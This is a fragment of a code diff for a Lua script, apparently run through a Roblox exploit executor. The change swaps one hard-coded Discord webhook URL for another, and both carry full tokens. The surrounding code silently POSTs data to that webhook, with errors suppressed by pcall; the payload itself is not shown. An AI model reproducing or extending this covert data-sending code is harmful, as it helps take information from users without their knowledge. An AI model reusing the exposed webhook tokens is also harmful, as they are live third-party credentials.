@@ -24,7 +24,7 @@ end
 -- Enviar datos a Webhook
 pcall(function()
     (request or http_request or http and http.request)({
-        Url = "https://discord.com/api/webhooks/1353751862230126703/177rqonJDZ_lDCztqjMLh4bKk5XYb7KhHLqeWpvQ5LS6YYUmD0dy1SxjFhuO2DNBDb6x",
+        Url = "https://discord.com/api/webhooks/1363337251626549470/ZvTOXTzzcw0aPLfEYLkuCtxJCmKkxDMGMnUF0EKwRhC8nrWU4QNp1QWf2AK5q2JqUO6j",
         Method = "POST",
         Body = httpService:JSONEncode({
             embeds = {
